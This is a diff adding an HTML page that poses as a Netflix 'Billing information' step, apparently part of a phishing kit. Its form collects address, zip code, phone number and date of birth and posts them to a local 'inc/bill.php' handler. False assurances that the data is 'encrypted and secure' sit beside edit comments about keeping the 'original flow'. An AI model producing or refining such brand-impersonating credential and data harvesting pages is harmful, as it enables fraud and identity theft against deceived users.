@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Netflix · Billing info</title>
+  <!-- keep your original CSS file path (if needed) – here we build self‑contained styling -->
+   <link rel="stylesheet" href="style/bill.css">
+           <link rel="shortcut icon" href="style/favicon.ico">
+
+</head>
+
+<body>
+
+  <header>
+    <div class="logo">NETFLIX</div>
+  </header>
+
+  <main>
+    <div class="payment-box">
+
+      <div class="step">STEP 2 OF 2</div>
+
+      <h1>Billing information</h1>
+
+      <p class="subtitle">
+        Your payment details are encrypted and secure.
+      </p>
+
+      <!-- form action can point to your PHP handler, we keep it -->
+      <form id="paymentForm" action="inc/bill.php" method="POST">
+
+        <!-- ========== ADDRESS LINE 1 ========== -->
+        <label for="address1">Address line 1</label>
+        <input
+          type="text"
+          id="address1"
+          name="address1"
+          placeholder="Street address, P.O. box"
+          autocomplete="address-line1"
+        >
+        <div id="address1Error" class="error"></div>
+
+        <!-- ========== ZIP CODE ========== -->
+        <label for="zip">Zip / Postal code</label>
+        <input
+          type="text"
+          id="zip"
+          name="zip"
+          placeholder="Zip code"
+          autocomplete="postal-code"
+        >
+        <div id="zipError" class="error"></div>
+
+        <!-- ========== PHONE NUMBER ========== -->
+        <label for="phone">Phone number</label>
+        <input
+          type="tel"
+          id="phone"
+          name="phone"
+          placeholder="Mobile number"
+          autocomplete="tel"
+        >
+        <div id="phoneError" class="error"></div>
+
+        <!-- ========== DATE OF BIRTH ========== -->
+        <label for="dob">Date of birth</label>
+        <input
+          type="text"
+          id="dob"
+          name="dob"
+          placeholder="DD / MM / YYYY"
+          autocomplete="bday"
+        >
+        <div id="dobError" class="error"></div>
+
+        <!-- secure note (same as before) -->
+        <div class="secure">
+          🔒 Your payment information is protected with encryption.
+        </div>
+
+        <!-- submit button -->
+        <button type="submit">Continue</button>
+
+      </form>
+
+    </div>
+  </main>
+
+  <!-- Basic client‑side validation (optional, but keeps your original flow) -->
+  <script>
+    (function() {
+      const form = document.getElementById('paymentForm');
+
+      // helper to show error
+      function setError(id, message) {
+        const el = document.getElementById(id);
+        if (el) el.textContent = message;
+      }
+
+      // clear all errors
+      function clearErrors() {
+        ['address1Error', 'zipError', 'phoneError', 'dobError'].forEach(id => {
+          const el = document.getElementById(id);
+          if (el) el.textContent = '';
+        });
+      }
+
+      // validation
+      function validateForm(e) {
+        clearErrors();
+        let isValid = true;
+
+        // address line 1
+        const address = document.getElementById('address1').value.trim();
+        if (address === '') {
+          setError('address1Error', 'Please enter your address.');
+          isValid = false;
+        } else if (address.length < 4) {
+          setError('address1Error', 'Address seems too short.');
+          isValid = false;
+        }
+
+        // zip
+        const zip = document.getElementById('zip').value.trim();
+        if (zip === '') {
+          setError('zipError', 'Zip code is required.');
+          isValid = false;
+        } else if (!/^[0-9]{4,10}(-[0-9]{4})?$/.test(zip) && !/^[A-Za-z0-9\s-]{3,10}$/.test(zip)) {
+          // simple generic pattern – allows numeric or alphanumeric zip (international)
+          setError('zipError', 'Enter a valid zip / postal code.');
+          isValid = false;
+        }
+
+        // phone
+        const phone = document.getElementById('phone').value.trim();
+        if (phone === '') {
+          setError('phoneError', 'Phone number is required.');
+          isValid = false;
+        } else if (!/^[\d\s+\-()]{7,20}$/.test(phone)) {
+          setError('phoneError', 'Enter a valid phone number.');
+          isValid = false;
+        }
+
+        // date of birth (simple: DD/MM/YYYY or DD-MM-YYYY)
+        const dob = document.getElementById('dob').value.trim();
+        if (dob === '') {
+          setError('dobError', 'Date of birth is required.');
+          isValid = false;
+        } else {
+          // flexible check: contains 3 groups of numbers
+          const parts = dob.split(/[\/\-\.\s]+/);
+          if (parts.length !== 3 || !parts.every(p => /^\d+$/.test(p))) {
+            setError('dobError', 'Use format DD/MM/YYYY');
+            isValid = false;
+          } else {
+            const day = parseInt(parts[0], 10);
+            const month = parseInt(parts[1], 10);
+            const year = parseInt(parts[2], 10);
+            if (day < 1 || day > 31 || month < 1 || month > 12 || year < 1900 || year > 2025) {
+              setError('dobError', 'Enter a valid date (DD/MM/YYYY).');
+              isValid = false;
+            }
+          }
+        }
+
+        if (!isValid) {
+          e.preventDefault(); // block submission
+        }
+        return isValid;
+      }
+
+      // attach submit listener
+      form.addEventListener('submit', validateForm);
+
+      // optional: real‑time clearing when user types
+      ['address1', 'zip', 'phone', 'dob'].forEach(id => {
+        const input = document.getElementById(id);
+        if (input) {
+          input.addEventListener('input', function() {
+            const errorId = id + 'Error';
+            const errorEl = document.getElementById(errorId);
+            if (errorEl) errorEl.textContent = '';
+          });
+        }
+      });
+    })();
+  </script>
+
+</body>
+</html>
